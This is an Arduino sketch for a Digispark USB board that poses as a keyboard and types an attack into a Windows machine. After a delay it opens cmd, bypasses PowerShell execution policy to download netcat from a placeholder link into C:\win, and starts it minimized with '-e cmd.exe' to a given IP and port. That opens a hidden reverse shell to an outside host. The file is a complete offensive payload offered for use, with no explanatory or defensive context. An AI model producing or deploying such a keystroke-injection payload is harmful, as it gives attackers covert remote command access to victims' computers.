#include "DigiKeyboard.h"

void setup() {
  // don't need to set anything up to use DigiKeyboard

  // this is generally not necessary but with some older systems it seems to
  // prevent missing the first character after a delay:
  DigiKeyboard.sendKeyStroke(0);

  DigiKeyboard.delay(15000);

  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);

  DigiKeyboard.delay(1000);

  DigiKeyboard.print("cmd");

  DigiKeyboard.delay(1000);

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(2000);

  DigiKeyboard.print("cd / & mkdir win & cd win & echo (new-object System.Net.WebClient).DownloadFile('<LINK_TO_NC_EXE>','C:\\win\\a.exe') > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1");

  DigiKeyboard.delay(1000);
  
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.print("START /MIN a.exe IP PORT -e cmd.exe -d & exit");

  DigiKeyboard.delay(1000);

  DigiKeyboard.sendKeyStroke(KEY_ENTER);


  } 
void loop() {
}
